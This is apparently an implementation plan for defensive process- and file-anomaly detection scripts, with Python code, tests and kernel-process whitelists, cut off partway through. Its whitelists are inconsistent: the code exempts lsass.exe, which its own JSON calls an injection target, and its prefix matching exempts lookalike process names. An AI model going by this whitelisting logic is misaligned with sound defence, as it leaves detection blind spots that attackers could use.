# IR & Threat Hunting Scripts Implementation Plan

> **For Claude:** REQUIRED SUB-SKILL: Use superpowers:executing-plans to implement this plan task-by-task.

**Goal:** Build a suite of incident response and threat hunting scripts for SOC/IR teams (CrowdStrike Overwatch, Sentinel) to detect process anomalies, file anomalies, hunt processes, and isolate network connections.

**Architecture:** Python 3.x scripts with JSON baselines, colored terminal output via `colorama`, cross-platform support. Network isolation uses native shell scripts (Bash for Linux, PowerShell for Windows). Modular design with shared utilities.

**Tech Stack:** Python 3.8+, colorama, psutil, json, re, argparse | Bash (iptables/ufw) | PowerShell (netsh)

---

## Project Structure

```
/home/kali/elastic_ir_scripts/
├── ir_scripts/
│   ├── __init__.py
│   ├── utils/
│   │   ├── __init__.py
│   │   ├── colors.py              # Colored output utilities
│   │   └── process_utils.py       # Shared process utilities
│   ├── process_anomaly.py         # Script 1: Process anomaly detection
│   ├── file_anomaly.py            # Script 2: File anomaly detection
│   ├── process_hunter.py          # Script 3: Process regex hunter
│   ├── baselines/
│   │   └── .gitkeep
│   └── whitelists/
│       ├── kernel_processes_linux.json
│       └── kernel_processes_windows.json
├── network_isolation/
│   ├── linux/
│   │   ├── network_isolate_iptables.sh
│   │   └── network_isolate_ufw.sh
│   └── windows/
│       └── network_isolate.ps1
├── tests/
│   ├── __init__.py
│   ├── test_process_anomaly.py
│   ├── test_file_anomaly.py
│   ├── test_process_hunter.py
│   └── fixtures/
│       ├── synthetic_baseline.json
│       └── synthetic_processes.json
└── requirements.txt
```

---

## Script 1: Process Anomaly Detection

### Task 1.1: Create Project Structure

**Files:**
- Create: `ir_scripts/__init__.py`
- Create: `ir_scripts/utils/__init__.py`
- Create: `ir_scripts/baselines/.gitkeep`
- Create: `ir_scripts/whitelists/.gitkeep`
- Create: `requirements.txt`

**Step 1: Create directory structure**

```bash
mkdir -p /home/kali/elastic_ir_scripts/ir_scripts/utils
mkdir -p /home/kali/elastic_ir_scripts/ir_scripts/baselines
mkdir -p /home/kali/elastic_ir_scripts/ir_scripts/whitelists
mkdir -p /home/kali/elastic_ir_scripts/network_isolation/linux
mkdir -p /home/kali/elastic_ir_scripts/network_isolation/windows
mkdir -p /home/kali/elastic_ir_scripts/tests/fixtures
```

**Step 2: Create requirements.txt**

```
psutil>=5.9.0
colorama>=0.4.6
```

**Step 3: Create __init__.py files**

```python
# ir_scripts/__init__.py
"""IR and Threat Hunting Scripts Suite."""
__version__ = "1.0.0"
```

```python
# ir_scripts/utils/__init__.py
"""Utility modules for IR scripts."""
```

```python
# tests/__init__.py
"""Test suite for IR scripts."""
```

**Step 4: Commit**

```bash
git init
git add -A
git commit -m "chore: initialize project structure"
```

---

### Task 1.2: Create Color Utilities

**Files:**
- Create: `ir_scripts/utils/colors.py`
- Test: `tests/test_colors.py`

**Step 1: Write failing test**

```python
# tests/test_colors.py
import unittest
from ir_scripts.utils.colors import Colors, print_header, print_success, print_warning, print_error, print_info

class TestColors(unittest.TestCase):
    def test_colors_class_has_attributes(self):
        self.assertTrue(hasattr(Colors, 'RED'))
        self.assertTrue(hasattr(Colors, 'GREEN'))
        self.assertTrue(hasattr(Colors, 'YELLOW'))
        self.assertTrue(hasattr(Colors, 'BLUE'))
        self.assertTrue(hasattr(Colors, 'RESET'))

    def test_print_functions_exist(self):
        # These should not raise
        print_header("Test")
        print_success("Test")
        print_warning("Test")
        print_error("Test")
        print_info("Test")

if __name__ == '__main__':
    unittest.main()
```

**Step 2: Run test to verify it fails**

Run: `cd /home/kali/elastic_ir_scripts && python -m pytest tests/test_colors.py -v`
Expected: FAIL with "ModuleNotFoundError"

**Step 3: Write implementation**

```python
# ir_scripts/utils/colors.py
"""Colored output utilities for terminal display."""
from colorama import init, Fore, Back, Style

# Initialize colorama for cross-platform support
init(autoreset=True)

class Colors:
    """ANSI color codes for terminal output."""
    RED = Fore.RED
    GREEN = Fore.GREEN
    YELLOW = Fore.YELLOW
    BLUE = Fore.BLUE
    CYAN = Fore.CYAN
    MAGENTA = Fore.MAGENTA
    WHITE = Fore.WHITE
    RESET = Style.RESET_ALL
    BOLD = Style.BRIGHT

    # Background colors
    BG_RED = Back.RED
    BG_GREEN = Back.GREEN
    BG_YELLOW = Back.YELLOW

def print_header(text: str) -> None:
    """Print a formatted header."""
    print(f"\n{Colors.BOLD}{Colors.CYAN}{'='*60}")
    print(f"  {text}")
    print(f"{'='*60}{Colors.RESET}\n")

def print_success(text: str) -> None:
    """Print success message in green."""
    print(f"{Colors.GREEN}[+] {text}{Colors.RESET}")

def print_warning(text: str) -> None:
    """Print warning message in yellow."""
    print(f"{Colors.YELLOW}[!] {text}{Colors.RESET}")

def print_error(text: str) -> None:
    """Print error message in red."""
    print(f"{Colors.RED}[-] {text}{Colors.RESET}")

def print_info(text: str) -> None:
    """Print info message in blue."""
    print(f"{Colors.BLUE}[*] {text}{Colors.RESET}")

def print_anomaly(text: str) -> None:
    """Print anomaly detection in bold red."""
    print(f"{Colors.BOLD}{Colors.RED}[ANOMALY] {text}{Colors.RESET}")

def print_table_header(columns: list) -> None:
    """Print formatted table header."""
    header = " | ".join(f"{col:^15}" for col in columns)
    print(f"{Colors.BOLD}{Colors.WHITE}{header}{Colors.RESET}")
    print(f"{Colors.WHITE}{'-' * len(header)}{Colors.RESET}")

def print_table_row(values: list, highlight: bool = False) -> None:
    """Print formatted table row."""
    row = " | ".join(f"{str(val):^15}" for val in values)
    if highlight:
        print(f"{Colors.YELLOW}{row}{Colors.RESET}")
    else:
        print(row)
```

**Step 4: Run test to verify it passes**

Run: `cd /home/kali/elastic_ir_scripts && python -m pytest tests/test_colors.py -v`
Expected: PASS

**Step 5: Commit**

```bash
git add ir_scripts/utils/colors.py tests/test_colors.py
git commit -m "feat: add colored output utilities"
```

---

### Task 1.3: Create Process Utilities

**Files:**
- Create: `ir_scripts/utils/process_utils.py`
- Test: `tests/test_process_utils.py`

**Step 1: Write failing test**

```python
# tests/test_process_utils.py
import unittest
import json
from ir_scripts.utils.process_utils import (
    get_process_attributes,
    get_all_processes,
    is_kernel_process,
    compute_process_hash
)

class TestProcessUtils(unittest.TestCase):
    def test_get_all_processes_returns_list(self):
        processes = get_all_processes()
        self.assertIsInstance(processes, list)
        self.assertGreater(len(processes), 0)

    def test_process_has_required_attributes(self):
        processes = get_all_processes()
        if processes:
            proc = processes[0]
            required = ['pid', 'name', 'ppid', 'username', 'cmdline', 'exe', 'status']
            for attr in required:
                self.assertIn(attr, proc)

    def test_is_kernel_process_identifies_kthreadd(self):
        # kthreadd (PID 2) is always a kernel process on Linux
        import platform
        if platform.system() == 'Linux':
            self.assertTrue(is_kernel_process('kthreadd', 2))

    def test_compute_process_hash_returns_string(self):
        result = compute_process_hash('/bin/ls')
        self.assertIsInstance(result, (str, type(None)))

if __name__ == '__main__':
    unittest.main()
```

**Step 2: Run test to verify it fails**

Run: `cd /home/kali/elastic_ir_scripts && python -m pytest tests/test_process_utils.py -v`
Expected: FAIL with "ModuleNotFoundError"

**Step 3: Write implementation**

```python
# ir_scripts/utils/process_utils.py
"""Process utilities for gathering and analyzing process information."""
import os
import platform
import hashlib
from typing import Dict, List, Optional, Any
from datetime import datetime

try:
    import psutil
except ImportError:
    psutil = None

# Kernel processes that should be whitelisted (cannot be injected)
LINUX_KERNEL_PROCESSES = {
    'kthreadd', 'kworker', 'ksoftirqd', 'kswapd', 'migration',
    'rcu_sched', 'rcu_bh', 'watchdog', 'cpuhp', 'netns',
    'kauditd', 'khungtaskd', 'oom_reaper', 'writeback',
    'kcompactd', 'khugepaged', 'crypto', 'kintegrityd',
    'kblockd', 'devfreq_wq', 'kswapd0', 'ecryptfs-kthread',
    'kthrotld', 'irq/', 'lru-add-drain', 'charger_manager',
    'scsi_', 'md', 'edac-poller', 'ipv6_addrconf'
}

WINDOWS_KERNEL_PROCESSES = {
    'System', 'Registry', 'smss.exe', 'csrss.exe', 'wininit.exe',
    'services.exe', 'lsass.exe', 'winlogon.exe', 'Memory Compression',
    'Secure System', 'ntoskrnl.exe'
}

def get_process_attributes(proc: 'psutil.Process') -> Optional[Dict[str, Any]]:
    """
    Extract comprehensive attributes from a process.

    Attributes collected (based on CrowdStrike/Sentinel threat hunting):
    - pid: Process ID
    - ppid: Parent Process ID
    - name: Process name
    - exe: Executable path
    - cmdline: Full command line
    - username: Owner username
    - status: Process status (running, sleeping, etc.)
    - create_time: Process creation timestamp
    - cwd: Current working directory
    - num_threads: Number of threads
    - num_fds: Number of file descriptors (Linux)
    - memory_percent: Memory usage percentage
    - cpu_percent: CPU usage percentage
    - connections: Network connections
    - open_files: Open file handles
    - environ: Environment variables (security sensitive)
    - nice: Process priority
    - ionice: I/O priority (Linux)
    """
    try:
        with proc.oneshot():
            attrs = {
                'pid': proc.pid,
                'ppid': proc.ppid() if proc.ppid() else 0,
                'name': proc.name(),
                'exe': None,
                'cmdline': None,
                'username': None,
                'status': proc.status(),
                'create_time': None,
                'cwd': None,
                'num_threads': None,
                'num_fds': None,
                'memory_percent': None,
                'cpu_percent': None,
                'memory_rss': None,
                'memory_vms': None,
                'nice': None,
                'connections': [],
                'open_files': [],
                'exe_hash': None,
                'exe_size': None,
            }

            # Safe attribute extraction with error handling
            try:
                attrs['exe'] = proc.exe()
            except (psutil.AccessDenied, psutil.NoSuchProcess, FileNotFoundError):
                pass

            try:
                attrs['cmdline'] = ' '.join(proc.cmdline()) if proc.cmdline() else ''
            except (psutil.AccessDenied, psutil.NoSuchProcess):
                pass

            try:
                attrs['username'] = proc.username()
            except (psutil.AccessDenied, psutil.NoSuchProcess):
                pass

            try:
                attrs['create_time'] = datetime.fromtimestamp(
                    proc.create_time()
                ).isoformat()
            except (psutil.AccessDenied, psutil.NoSuchProcess, OSError):
                pass

            try:
                attrs['cwd'] = proc.cwd()
            except (psutil.AccessDenied, psutil.NoSuchProcess):
                pass

            try:
                attrs['num_threads'] = proc.num_threads()
            except (psutil.AccessDenied, psutil.NoSuchProcess):
                pass

            try:
                if platform.system() == 'Linux':
                    attrs['num_fds'] = proc.num_fds()
            except (psutil.AccessDenied, psutil.NoSuchProcess):
                pass

            try:
                mem_info = proc.memory_info()
                attrs['memory_rss'] = mem_info.rss
                attrs['memory_vms'] = mem_info.vms
                attrs['memory_percent'] = round(proc.memory_percent(), 2)
            except (psutil.AccessDenied, psutil.NoSuchProcess):
                pass

            try:
                attrs['cpu_percent'] = proc.cpu_percent(interval=0.1)
            except (psutil.AccessDenied, psutil.NoSuchProcess):
                pass

            try:
                attrs['nice'] = proc.nice()
            except (psutil.AccessDenied, psutil.NoSuchProcess):
                pass

            try:
                conns = proc.net_connections(kind='inet')
                attrs['connections'] = [
                    {
                        'fd': c.fd,
                        'family': str(c.family),
                        'type': str(c.type),
                        'laddr': f"{c.laddr.ip}:{c.laddr.port}" if c.laddr else None,
                        'raddr': f"{c.raddr.ip}:{c.raddr.port}" if c.raddr else None,
                        'status': c.status
                    }
                    for c in conns
                ]
            except (psutil.AccessDenied, psutil.NoSuchProcess):
                pass

            try:
                files = proc.open_files()
                attrs['open_files'] = [f.path for f in files[:20]]  # Limit to 20
            except (psutil.AccessDenied, psutil.NoSuchProcess):
                pass

            # Compute executable hash if available
            if attrs['exe'] and os.path.exists(attrs['exe']):
                attrs['exe_hash'] = compute_process_hash(attrs['exe'])
                try:
                    attrs['exe_size'] = os.path.getsize(attrs['exe'])
                except OSError:
                    pass

            return attrs
    except (psutil.NoSuchProcess, psutil.AccessDenied):
        return None

def get_all_processes() -> List[Dict[str, Any]]:
    """Get all running processes with their attributes."""
    if psutil is None:
        raise ImportError("psutil is required. Install with: pip install psutil")

    processes = []
    for proc in psutil.process_iter():
        attrs = get_process_attributes(proc)
        if attrs:
            processes.append(attrs)
    return processes

def is_kernel_process(name: str, pid: int) -> bool:
    """
    Check if a process is a protected kernel process.

    These processes cannot be injected by attackers and should be whitelisted.
    Note: This does NOT include processes like svchost.exe or systemd which
    CAN be targets of process injection.
    """
    system = platform.system()

    if system == 'Linux':
        # Kernel threads have PPID of 2 (kthreadd) and no exe
        if pid <= 2:
            return True
        # Check against known kernel process names
        for kernel_proc in LINUX_KERNEL_PROCESSES:
            if name.startswith(kernel_proc) or name == kernel_proc:
                return True
        # Check if it's a kernel thread (no /proc/pid/exe or [bracketed] name)
        if name.startswith('[') and name.endswith(']'):
            return True
        try:
            exe_link = f'/proc/{pid}/exe'
            if os.path.islink(exe_link):
                target = os.readlink(exe_link)
                if not target or target == '':
                    return True
        except (OSError, FileNotFoundError):
            pass

    elif system == 'Windows':
        if name in WINDOWS_KERNEL_PROCESSES:
            return True
        if pid == 0 or pid == 4:  # System Idle and System
            return True

    return False

def compute_process_hash(exe_path: str, algorithm: str = 'sha256') -> Optional[str]:
    """Compute hash of executable file."""
    if not exe_path or not os.path.exists(exe_path):
        return None

    try:
        hasher = hashlib.new(algorithm)
        with open(exe_path, 'rb') as f:
            for chunk in iter(lambda: f.read(8192), b''):
                hasher.update(chunk)
        return hasher.hexdigest()
    except (OSError, PermissionError):
        return None

def compare_processes(baseline: List[Dict], current: List[Dict]) -> Dict[str, List]:
    """
    Compare current processes against baseline.

    Returns:
        Dict with keys: 'new', 'missing', 'modified'
    """
    baseline_by_name_exe = {
        (p.get('name'), p.get('exe')): p for p in baseline
    }
    current_by_name_exe = {
        (p.get('name'), p.get('exe')): p for p in current
    }

    baseline_keys = set(baseline_by_name_exe.keys())
    current_keys = set(current_by_name_exe.keys())

    new_processes = []
    missing_processes = []
    modified_processes = []

    # New processes not in baseline
    for key in current_keys - baseline_keys:
        proc = current_by_name_exe[key]
        if not is_kernel_process(proc.get('name', ''), proc.get('pid', 0)):
            new_processes.append(proc)

    # Missing processes from baseline
    for key in baseline_keys - current_keys:
        missing_processes.append(baseline_by_name_exe[key])

    # Modified processes (same name/exe but different attributes)
    for key in baseline_keys & current_keys:
        base_proc = baseline_by_name_exe[key]
        curr_proc = current_by_name_exe[key]

        # Check for significant changes
        changes = []
        if base_proc.get('exe_hash') and curr_proc.get('exe_hash'):
            if base_proc['exe_hash'] != curr_proc['exe_hash']:
                changes.append(('exe_hash', base_proc['exe_hash'], curr_proc['exe_hash']))

        if base_proc.get('exe_size') and curr_proc.get('exe_size'):
            if base_proc['exe_size'] != curr_proc['exe_size']:
                changes.append(('exe_size', base_proc['exe_size'], curr_proc['exe_size']))

        if changes:
            modified_processes.append({
                'process': curr_proc,
                'changes': changes
            })

    return {
        'new': new_processes,
        'missing': missing_processes,
        'modified': modified_processes
    }
```

**Step 4: Run test to verify it passes**

Run: `cd /home/kali/elastic_ir_scripts && python -m pytest tests/test_process_utils.py -v`
Expected: PASS

**Step 5: Commit**

```bash
git add ir_scripts/utils/process_utils.py tests/test_process_utils.py
git commit -m "feat: add process utilities with attribute extraction"
```

---

### Task 1.4: Create Kernel Process Whitelist

**Files:**
- Create: `ir_scripts/whitelists/kernel_processes_linux.json`
- Create: `ir_scripts/whitelists/kernel_processes_windows.json`

**Step 1: Create Linux whitelist**

```json
{
  "description": "Protected kernel processes that cannot be injected - safe to whitelist",
  "version": "1.0.0",
  "last_updated": "2026-01-16",
  "platform": "linux",
  "note": "Does NOT include systemd, svchost equivalents which CAN be injection targets",
  "processes": [
    {"name": "kthreadd", "description": "Kernel thread daemon (PID 2)"},
    {"name": "kworker/*", "description": "Kernel worker threads", "pattern": true},
    {"name": "ksoftirqd/*", "description": "Soft IRQ daemon", "pattern": true},
    {"name": "kswapd*", "description": "Kernel swap daemon", "pattern": true},
    {"name": "migration/*", "description": "CPU migration threads", "pattern": true},
    {"name": "rcu_sched", "description": "RCU scheduler"},
    {"name": "rcu_bh", "description": "RCU bottom half"},
    {"name": "watchdog/*", "description": "Watchdog threads", "pattern": true},
    {"name": "cpuhp/*", "description": "CPU hotplug", "pattern": true},
    {"name": "kauditd", "description": "Kernel audit daemon"},
    {"name": "khungtaskd", "description": "Hung task detector"},
    {"name": "oom_reaper", "description": "OOM killer reaper"},
    {"name": "writeback", "description": "Writeback thread"},
    {"name": "kcompactd*", "description": "Memory compaction", "pattern": true},
    {"name": "khugepaged", "description": "Huge page daemon"},
    {"name": "kintegrityd", "description": "Integrity check daemon"},
    {"name": "kblockd", "description": "Block device daemon"},
    {"name": "kthrotld", "description": "Block throttle daemon"},
    {"name": "irq/*", "description": "IRQ threads", "pattern": true},
    {"name": "scsi_*", "description": "SCSI threads", "pattern": true},
    {"name": "md*_*", "description": "MD RAID threads", "pattern": true},
    {"name": "edac-poller", "description": "ECC error detection"},
    {"name": "ipv6_addrconf", "description": "IPv6 address config"},
    {"name": "netns", "description": "Network namespace"}
  ]
}
```

**Step 2: Create Windows whitelist**

```json
{
  "description": "Protected kernel/system processes that cannot be injected - safe to whitelist",
  "version": "1.0.0",
  "last_updated": "2026-01-16",
  "platform": "windows",
  "note": "Does NOT include svchost.exe, lsass.exe which CAN be injection targets",
  "processes": [
    {"name": "System", "pid": 4, "description": "NT Kernel & System"},
    {"name": "Registry", "description": "Registry hive process"},
    {"name": "Secure System", "description": "Secure kernel"},
    {"name": "Memory Compression", "description": "Memory compression service"},
    {"name": "smss.exe", "description": "Session Manager - early boot only"},
    {"name": "csrss.exe", "description": "Client/Server Runtime - protected"},
    {"name": "wininit.exe", "description": "Windows Initialization"},
    {"name": "services.exe", "description": "Service Control Manager"},
    {"name": "winlogon.exe", "description": "Windows Logon"}
  ],
  "suspicious_if_multiple": [
    "lsass.exe",
    "csrss.exe",
    "smss.exe",
    "services.exe",
    "wininit.exe"
  ]
}
```

**Step 3: Commit**

```bash
git add ir_scripts/whitelists/
git commit -m "feat: add kernel process whitelists for Linux and Windows"
```

---

### Task 1.5: Create Main Process Anomaly Detection Script

**Files:**
- Create: `ir_scripts/process_anomaly.py`
- Test: `tests/test_process_anomaly.py`

**Step 1: Write failing test**

```python
# tests/test_process_anomaly.py
import unittest
import json
import tempfile
import os
from ir_scripts.process_anomaly import (
    create_baseline,
    load_baseline,
    run_anomaly_scan,
    display_anomalies
)

class TestProcessAnomaly(unittest.TestCase):
    def setUp(self):
        self.temp_dir = tempfile.mkdtemp()
        self.baseline_path = os.path.join(self.temp_dir, 'test_baseline.json')

    def tearDown(self):
        if os.path.exists(self.baseline_path):
            os.remove(self.baseline_path)
        os.rmdir(self.temp_dir)

    def test_create_baseline_creates_file(self):
        create_baseline(self.baseline_path)
        self.assertTrue(os.path.exists(self.baseline_path))

    def test_baseline_has_required_structure(self):
        create_baseline(self.baseline_path)
        with open(self.baseline_path) as f:
            data = json.load(f)
        self.assertIn('timestamp', data)
        self.assertIn('hostname', data)
        self.assertIn('platform', data)
        self.assertIn('processes', data)
        self.assertIsInstance(data['processes'], list)

    def test_load_baseline_returns_dict(self):
        create_baseline(self.baseline_path)
        baseline = load_baseline(self.baseline_path)
        self.assertIsInstance(baseline, dict)

    def test_run_anomaly_scan_returns_results(self):
        create_baseline(self.baseline_path)
        results = run_anomaly_scan(self.baseline_path)
        self.assertIn('new', results)
        self.assertIn('missing', results)
        self.assertIn('modified', results)

class TestSyntheticDataset(unittest.TestCase):
    """Test with synthetic datasets for predictable results."""

    def test_detect_new_process(self):
        baseline_procs = [
            {'pid': 1, 'name': 'init', 'exe': '/sbin/init', 'ppid': 0}
        ]
        current_procs = [
            {'pid': 1, 'name': 'init', 'exe': '/sbin/init', 'ppid': 0},
            {'pid': 1000, 'name': 'malware', 'exe': '/tmp/malware', 'ppid': 1}
        ]

        from ir_scripts.utils.process_utils import compare_processes
        results = compare_processes(baseline_procs, current_procs)

        self.assertEqual(len(results['new']), 1)
        self.assertEqual(results['new'][0]['name'], 'malware')

    def test_detect_missing_process(self):
        baseline_procs = [
            {'pid': 1, 'name': 'init', 'exe': '/sbin/init', 'ppid': 0},
            {'pid': 100, 'name': 'sshd', 'exe': '/usr/sbin/sshd', 'ppid': 1}
        ]
        current_procs = [
            {'pid': 1, 'name': 'init', 'exe': '/sbin/init', 'ppid': 0}
        ]

        from ir_scripts.utils.process_utils import compare_processes
        results = compare_processes(baseline_procs, current_procs)

        self.assertEqual(len(results['missing']), 1)
        self.assertEqual(results['missing'][0]['name'], 'sshd')

if __name__ == '__main__':
    unittest.main()
```

**Step 2: Run test to verify it fails**

Run: `cd /home/kali/elastic_ir_scripts && python -m pytest tests/test_process_anomaly.py -v`
Expected: FAIL with "ModuleNotFoundError"

**Step 3: Write implementation**

```python
#!/usr/bin/env python3
# ir_scripts/process_anomaly.py
"""
Process Anomaly Detection Script for Incident Response.

Features:
- Baseline mode: Record current processes as known-good state
- Scan mode: Compare current processes against baseline
- Highlights new, missing, and modified processes
- Whitelists protected kernel processes

Usage:
    python process_anomaly.py baseline              # Create new baseline
    python process_anomaly.py scan                  # Run anomaly scan
    python process_anomaly.py scan -b custom.json   # Use custom baseline
"""
import argparse
import json
import os
import platform
import sys
from datetime import datetime
from typing import Dict, List, Optional

# Add parent directory for imports
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from ir_scripts.utils.colors import (
    Colors, print_header, print_success, print_warning,
    print_error, print_info, print_anomaly, print_table_header, print_table_row
)
from ir_scripts.utils.process_utils import (
    get_all_processes, compare_processes, is_kernel_process
)

DEFAULT_BASELINE_DIR = os.path.join(os.path.dirname(__file__), 'baselines')
DEFAULT_BASELINE_FILE = 'process_baseline.json'

def get_baseline_path(custom_path: Optional[str] = None) -> str:
    """Get the baseline file path."""
    if custom_path:
        return custom_path
    os.makedirs(DEFAULT_BASELINE_DIR, exist_ok=True)
    return os.path.join(DEFAULT_BASELINE_DIR, DEFAULT_BASELINE_FILE)

def create_baseline(output_path: Optional[str] = None) -> str:
    """
    Create a new process baseline.

    Scans all running processes and records their attributes
    with timestamp for future comparison.
    """
    path = get_baseline_path(output_path)
    print_header("Creating Process Baseline")

    print_info(f"Scanning all running processes...")
    processes = get_all_processes()

    # Filter out kernel processes for cleaner baseline
    user_processes = [
        p for p in processes
        if not is_kernel_process(p.get('name', ''), p.get('pid', 0))
    ]

    baseline = {
        'timestamp': datetime.now().isoformat(),
        'hostname': platform.node(),
        'platform': platform.system(),
        'platform_version': platform.version(),
        'total_processes': len(processes),
        'user_processes': len(user_processes),
        'kernel_processes_filtered': len(processes) - len(user_processes),
        'processes': user_processes
    }

    with open(path, 'w') as f:
        json.dump(baseline, f, indent=2, default=str)

    print_success(f"Baseline created: {path}")
    print_info(f"Total processes scanned: {len(processes)}")
    print_info(f"User processes recorded: {len(user_processes)}")
    print_info(f"Kernel processes filtered: {len(processes) - len(user_processes)}")

    return path

def load_baseline(path: Optional[str] = None) -> Dict:
    """Load baseline from file."""
    path = get_baseline_path(path)

    if not os.path.exists(path):
        print_error(f"Baseline not found: {path}")
        print_info("Run 'process_anomaly.py baseline' first to create one.")
        sys.exit(1)

    with open(path) as f:
        return json.load(f)

def run_anomaly_scan(baseline_path: Optional[str] = None) -> Dict:
    """
    Run anomaly scan comparing current processes to baseline.

    Returns dict with 'new', 'missing', 'modified' process lists.
    """
    baseline = load_baseline(baseline_path)
    baseline_procs = baseline.get('processes', [])

    print_info("Scanning current processes...")
    current_procs = get_all_processes()

    # Filter kernel processes from current scan too
    current_user_procs = [
        p for p in current_procs
        if not is_kernel_process(p.get('name', ''), p.get('pid', 0))
    ]

    print_info(f"Comparing {len(current_user_procs)} current vs {len(baseline_procs)} baseline processes...")

    results = compare_processes(baseline_procs, current_user_procs)
    results['baseline_info'] = {
        'timestamp': baseline.get('timestamp'),
        'hostname': baseline.get('hostname'),
        'total_baseline': len(baseline_procs),
        'total_current': len(current_user_procs)
    }

    return results

def display_anomalies(results: Dict) -> None:
    """Display anomaly scan results with colored formatting."""
    new_procs = results.get('new', [])
    missing_procs = results.get('missing', [])
    modified_procs = results.get('modified', [])
    baseline_info = results.get('baseline_info', {})

    print_header("Process Anomaly Scan Results")

    # Summary
    print_info(f"Baseline from: {baseline_info.get('timestamp', 'Unknown')}")
    print_info(f"Baseline host: {baseline_info.get('hostname', 'Unknown')}")
    print_info(f"Baseline processes: {baseline_info.get('total_baseline', 0)}")
    print_info(f"Current processes: {baseline_info.get('total_current', 0)}")
    print()

    # Statistics
    total_anomalies = len(new_procs) + len(missing_procs) + len(modified_procs)
    if total_anomalies == 0:
        print_success("No anomalies detected! System matches baseline.")
        return

    print_warning(f"Total anomalies detected: {total_anomalies}")
    print()

    # New Processes (HIGH PRIORITY)
    if new_procs:
        print(f"\n{Colors.BOLD}{Colors.RED}=== NEW PROCESSES ({len(new_procs)}) ==={Colors.RESET}")
        print(f"{Colors.RED}These processes were NOT in the baseline - investigate immediately!{Colors.RESET}\n")

        for proc in new_procs:
            print_anomaly(f"NEW PROCESS DETECTED")
            print(f"  {Colors.YELLOW}PID:{Colors.RESET}      {proc.get('pid')}")
            print(f"  {Colors.YELLOW}Name:{Colors.RESET}     {proc.get('name')}")
            print(f"  {Colors.YELLOW}PPID:{Colors.RESET}     {proc.get('ppid')}")
            print(f"  {Colors.YELLOW}User:{Colors.RESET}     {proc.get('username')}")
            print(f"  {Colors.YELLOW}Exe:{Colors.RESET}      {proc.get('exe')}")
            print(f"  {Colors.YELLOW}Cmdline:{Colors.RESET}  {proc.get('cmdline', '')[:100]}")
            print(f"  {Colors.YELLOW}Created:{Colors.RESET}  {proc.get('create_time')}")
            print(f"  {Colors.YELLOW}CWD:{Colors.RESET}      {proc.get('cwd')}")
            print(f"  {Colors.YELLOW}Hash:{Colors.RESET}     {proc.get('exe_hash')}")
            if proc.get('connections'):
                print(f"  {Colors.YELLOW}Network:{Colors.RESET}  {len(proc['connections'])} connection(s)")
                for conn in proc['connections'][:3]:
                    print(f"           {conn.get('laddr')} -> {conn.get('raddr')} ({conn.get('status')})")
            print()

    # Missing Processes (MEDIUM PRIORITY)
    if missing_procs:
        print(f"\n{Colors.BOLD}{Colors.YELLOW}=== MISSING PROCESSES ({len(missing_procs)}) ==={Colors.RESET}")
        print(f"{Colors.YELLOW}These processes were in baseline but are no longer running{Colors.RESET}\n")

        print_table_header(['Name', 'Exe', 'User'])
        for proc in missing_procs[:20]:  # Limit display
            print_table_row([
                proc.get('name', 'N/A')[:15],
                (proc.get('exe') or 'N/A')[:15],
                (proc.get('username') or 'N/A')[:15]
            ])
        if len(missing_procs) > 20:
            print(f"  ... and {len(missing_procs) - 20} more")

    # Modified Processes (MEDIUM PRIORITY)
    if modified_procs:
        print(f"\n{Colors.BOLD}{Colors.MAGENTA}=== MODIFIED PROCESSES ({len(modified_procs)}) ==={Colors.RESET}")
        print(f"{Colors.MAGENTA}These processes have changed since baseline{Colors.RESET}\n")

        for item in modified_procs:
            proc = item['process']
            changes = item['changes']
            print(f"  {Colors.CYAN}{proc.get('name')}{Colors.RESET} (PID: {proc.get('pid')})")
            for attr, old, new in changes:
                print(f"    {attr}: {old} -> {new}")
            print()

    # Summary footer
    print(f"\n{Colors.BOLD}{'='*60}{Colors.RESET}")
    print(f"{Colors.RED}NEW: {len(new_procs)}{Colors.RESET} | ", end='')
    print(f"{Colors.YELLOW}MISSING: {len(missing_procs)}{Colors.RESET} | ", end='')
    print(f"{Colors.MAGENTA}MODIFIED: {len(modified_procs)}{Colors.RESET}")
    print(f"{Colors.BOLD}{'='*60}{Colors.RESET}")

def main():
    parser = argparse.ArgumentParser(
        description='Process Anomaly Detection for Incident Response',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s baseline                    Create new baseline
  %(prog)s scan                        Run anomaly scan
  %(prog)s scan -b /path/baseline.json Use custom baseline
  %(prog)s scan -o results.json        Save results to file
        """
    )

    parser.add_argument(
        'action',
        choices=['baseline', 'scan'],
        help='Action to perform: baseline (record) or scan (compare)'
    )
    parser.add_argument(
        '-b', '--baseline',
        help='Path to baseline file (default: baselines/process_baseline.json)'
    )
    parser.add_argument(
        '-o', '--output',
        help='Save scan results to JSON file'
    )
    parser.add_argument(
        '-q', '--quiet',
        action='store_true',
        help='Minimal output (only anomalies)'
    )

    args = parser.parse_args()

    try:
        if args.action == 'baseline':
            create_baseline(args.baseline)

        elif args.action == 'scan':
            print_header("Process Anomaly Detection Scan")
            results = run_anomaly_scan(args.baseline)
            display_anomalies(results)

            if args.output:
                with open(args.output, 'w') as f:
                    json.dump(results, f, indent=2, default=str)
                print_success(f"Results saved to: {args.output}")

    except KeyboardInterrupt:
        print_warning("\nScan interrupted by user")
        sys.exit(130)
    except Exception as e:
        print_error(f"Error: {e}")
        sys.exit(1)

if __name__ == '__main__':
    main()
```

**Step 4: Run test to verify it passes**

Run: `cd /home/kali/elastic_ir_scripts && python -m pytest tests/test_process_anomaly.py -v`
Expected: PASS

**Step 5: Commit**

```bash
git add ir_scripts/process_anomaly.py tests/test_process_anomaly.py
git commit -m "feat: add process anomaly detection script with baseline comparison"
```

---

## Script 2: File Anomaly Detection

### Task 2.1: Create File Utilities

**Files:**
- Create: `ir_scripts/utils/file_utils.py`
- Test: `tests/test_file_utils.py`

**Step 1: Write failing test**

```python
# tests/test_file_utils.py
import unittest
import tempfile
import os
from ir_scripts.utils.file_utils import (
    get_file_attributes,
    scan_directory,
    LINUX_SUSPICIOUS_PATHS,
    compute_file_hash
)

class TestFileUtils(unittest.TestCase):
    def test_suspicious_paths_defined(self):
        self.assertIsInstance(LINUX_SUSPICIOUS_PATHS, list)
        self.assertIn('/tmp', LINUX_SUSPICIOUS_PATHS)

    def test_get_file_attributes_returns_dict(self):
        with tempfile.NamedTemporaryFile(delete=False) as f:
            f.write(b'test content')
            path = f.name
        try:
            attrs = get_file_attributes(path)
            self.assertIsInstance(attrs, dict)
            self.assertIn('path', attrs)
            self.assertIn('size', attrs)
            self.assertIn('mtime', attrs)
        finally:
            os.unlink(path)

    def test_compute_file_hash(self):
